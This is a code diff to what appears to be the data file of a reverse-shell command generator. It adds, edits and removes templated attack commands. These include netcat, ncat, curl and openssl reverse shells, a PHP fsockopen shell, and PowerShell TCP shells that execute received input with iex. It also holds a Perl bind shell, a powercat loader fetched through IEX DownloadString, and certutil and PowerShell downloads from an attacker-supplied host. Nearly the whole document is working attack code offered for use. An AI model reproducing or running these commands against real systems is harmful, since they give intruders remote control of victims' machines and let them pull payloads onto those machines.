@@ -52,21 +52,21 @@ cat /tmp/f | bash -i 2>&1 | nc {ip} {port} >/tmp/f`,
             {
                 "title": "Netcat reverse TCP shell (Linux/Unix)",
                 "platform": "Linux/Unix",
-                "command": `nc {ip} {port} -e bash`,
+                "command": `nc {ip} {port} -e /bin/bash`,
                 "highlight": "language-bash",
                 "shorttag": "Netcat TCP Linux"
             },
             {
                 "title": "Netcat reverse TCP shell (Windows, nc.exe)",
                 "platform": "Windows",
-                "command": `nc.exe {ip} {port} -e bash`,
+                "command": `nc.exe {ip} {port} -e /bin/bash`,
                 "highlight": "language-bash",
                 "shorttag": "Netcat TCP Windows"
             },
             {
                 "title": "Netcat reverse TCP shell with -c option (Linux/Unix)",
                 "platform": "Linux/Unix",
-                "command": `nc -c bash {ip} {port}`,
+                "command": `nc -c /bin/bash {ip} {port}`,
                 "highlight": "language-bash",
                 "shorttag": "Netcat -c Linux"
             }
@@ -75,47 +75,17 @@ cat /tmp/f | bash -i 2>&1 | nc {ip} {port} >/tmp/f`,
             {
                 "title": "Ncat reverse TCP shell (Linux/Unix)",
                 "platform": "Linux/Unix",
-                "command": `ncat {ip} {port} -e bash`,
+                "command": `ncat {ip} {port} -e /bin/bash`,
                 "highlight": "language-bash",
                 "shorttag": "Ncat TCP Linux"
             },
             {
                 "title": "Ncat reverse TCP shell (Windows, ncat.exe)",
                 "platform": "Windows",
-                "command": `ncat.exe {ip} {port} -e bash`,
+                "command": `ncat.exe {ip} {port} -e /bin/bash`,
                 "highlight": "language-bash",
                 "shorttag": "Ncat TCP Windows"
             },
-            {
-                "title": "Bash reverse UDP shell using mkfifo and ncat (Linux/Unix)",
-                "platform": "Linux/Unix",
-                "command": `rm /tmp/f;
-mkfifo /tmp/f;
-cat /tmp/f | bash -i 2>&1 | ncat -u {ip} {port} >/tmp/f`,
-                "highlight": "language-bash",
-                "shorttag": "Ncat mkfifo Linux"
-            }
-        ],
-        "curl": [
-            {
-                "title": "Reverse shell using curl (Linux/Unix)",
-                "platform": "Linux/Unix",
-                "command": `C='curl -Ns telnet://{ip}:{port}';
-$C </dev/null 2>&1 | bash 2>&1 | $C >/dev/null`,
-                "highlight": "language-bash",
-                "shorttag": "Curl Linux"
-            }
-        ],
-        "openssl": [
-            {
-                "title": "Bash reverse shell using openssl (Linux/Unix)",
-                "platform": "Linux/Unix",
-                "command": `mkfifo /tmp/s;
-bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ip}:{port} > /tmp/s;
-rm /tmp/s`,
-                "highlight": "language-bash",
-                "shorttag": "OpenSSL Linux"
-            }
         ],
         "perl": [
             {
@@ -147,7 +117,14 @@ system$_ while<>'`,
         ],
         "php": [
             {
-                "title": "PHP reverse shell - pentestmonkey - (Linux/Unix)",
+                "title": "PHP reverse shell - (Linux/Unix)",
+                "platform": "Linux/Unix",
+                "command": `php -r '$sock=fsockopen("{ip}",{port});exec("/bin/bash <&3 >&3 2>&3");'`,
+                "highlight": "language-php",
+                "shorttag": "PHP reverse local Linux"
+            },
+            {
+                "title": "PHP reverse shell (web) - pentestmonkey - (Linux/Unix)",
                 "platform": "Linux/Unix",
                 "command": `<?php
 // php-reverse-shell - A Reverse Shell implementation in PHP
@@ -396,46 +373,32 @@ $StreamWriter.Close()`,
             {
                 "title": "PowerShell reverse TCP shell (Windows, PowerShell 2.0+)",
                 "platform": "Windows, PowerShell 2.0+",
-                "command": `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});
-$stream = $client.GetStream(); 
-[byte[]]$bytes = 0..65535|%{0};
-while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
-    ;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
-    $sendback = (iex $data 2>&1 | Out-String );
-    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
-    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); 
-    $stream.Write($sendbyte,0,$sendbyte.Length);
-    $stream.Flush()
-};
-$client.Close()"`,
+                "command": `try {
+    $client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});
+    $stream = $client.GetStream();
+    [byte[]]$bytes = 0..65535|%{0};
+    
+    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
+        try {
+            $sendback = (iex $data 2>&1 | Out-String);
+        } catch {
+            $sendback = "Error executing command: $_";
+        }
+        $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
+        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); 
+        $stream.Write($sendbyte, 0, $sendbyte.Length);
+        $stream.Flush();
+    }
+    
+    $client.Close();
+} catch {
+    Write-Error "An error occurred: $_"
+}
+`,
                 "highlight": "language-powershell",
                 "shorttag": "PowerShell 2.0+ nop"
             },
-            {
-                "title": "PowerShell reverse TCP shell (Windows, PowerShell 3.0+)",
-                "platform": "Windows, PowerShell 3.0+",
-                "command": `powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('{ip}', {port});
-$NetworkStream = $TCPClient.GetStream(); 
-$StreamWriter = New-Object IO.StreamWriter($NetworkStream);
-function WriteToStream ($String) {
-    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};
-    $StreamWriter.Write($String + 'SHELL> ');
-    $StreamWriter.Flush()
-} 
-WriteToStream '';
-while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
-    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);
-    $Output = try {
-        Invoke-Expression $Command 2>&1 | Out-String
-    } catch {
-        $_ | Out-String
-    } 
-    WriteToStream ($Output)
-}
-$StreamWriter.Close()"`,
-                "highlight": "language-powershell",
-                "shorttag": "PowerShell 3.0+"
-            }
         ],
         "python": [
             {
@@ -516,9 +479,21 @@ const bindShells = {
                 "title": "Perl bind shell (Linux/Unix)",
                 "platform": "Linux/Unix",
                 "command": `# Victim (listen)
-perl -e 'use Socket;$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));\
-bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);\
-close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/bash -i");};'
+perl -e '
+use Socket;
+$p={port};
+socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")) or die "Socket creation failed: $!";
+bind(S,sockaddr_in($p, INADDR_ANY)) or die "Bind failed: $!";
+listen(S,SOMAXCONN) or die "Listen failed: $!";
+while ($p = accept(C,S)) {
+    open(STDIN, ">&C") or die "Dup STDIN failed: $!";
+    open(STDOUT, ">&C") or die "Dup STDOUT failed: $!";
+    open(STDERR, ">&C") or die "Dup STDERR failed: $!";
+    exec("/bin/bash -i") or die "Exec failed: $!";
+    close C;
+}
+'
+
 
 # Connect from attacker
 nc {ip} {port}`,
@@ -619,14 +594,18 @@ socat FILE:\`tty\`,raw,echo=0 TCP:{ip}:{port}`,
                 "title": "Powershell bind shell",
                 "platform": "Windows",
                 "command": `# https://github.com/besimorhino/powercat
+# instructions:
+Load The Function From Downloaded .ps1 File:
+    . .\powercat.ps1
+Load The Function From URL:
+    IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
 
 # Victim (listen)
 . .\\powercat.ps1
-powercat -l -p {port} -ep
+powercat -l -p {port} -e powershell
 
 # Connect from attacker
-. .\\powercat.ps1
-powercat -c {ip} -p {port}`,
+nc {ip} {port}`,
                 "highlight": "language-powershell",
                 "shorttag": "Powershell bind shell"
             }
@@ -675,7 +654,7 @@ curl http://{ip}:{port}{filepath} -o {newfilename}`,
                 "title": "Transfer files using CMD (Certutil)",
                 "platform": "Windows",
                 "command": `# Using CMD
-certutil -urlcache -split -f http://{ip}:{port}{filepath} C:\\{newfilename}`,
+certutil -urlcache -split -f http://{ip}:{port}{filepath} {newfilename}`,
                 "highlight": "language-powershell",
                 "shorttag": "CMD"
             },
@@ -683,7 +662,7 @@ certutil -urlcache -split -f http://{ip}:{port}{filepath} C:\\{newfilename}`,
                 "title": "Transfer files using PowerShell",
                 "platform": "Windows",
                 "command": `# Using PowerShell
-Invoke-WebRequest -Uri http://{ip}:{port}{filepath} -OutFile C:\\{newfilename}`,
+Invoke-WebRequest -Uri http://{ip}:{port}{filepath} -OutFile {newfilename}`,
                 "highlight": "language-powershell",
                 "shorttag": "PowerShell"
             },
@@ -691,18 +670,10 @@ Invoke-WebRequest -Uri http://{ip}:{port}{filepath} -OutFile C:\\{newfilename}`,
                 "title": "Transfer files using Curl",
                 "platform": "Windows",
                 "command": `# Using Curl
-curl http://{ip}:{port}{filepath} -o C:\\{newfilename}`,
+curl http://{ip}:{port}{filepath} -o {newfilename}`,
                 "highlight": "language-bash",
                 "shorttag": "Curl"
             },
-            {
-                "title": "Transfer files using Wget",
-                "platform": "Windows",
-                "command": `# Using Wget
-wget http://{ip}:{port}{filepath} -O C:\\{newfilename}`,
-                "highlight": "language-bash",
-                "shorttag": "Wget"
-            }
         ]
     }
 };
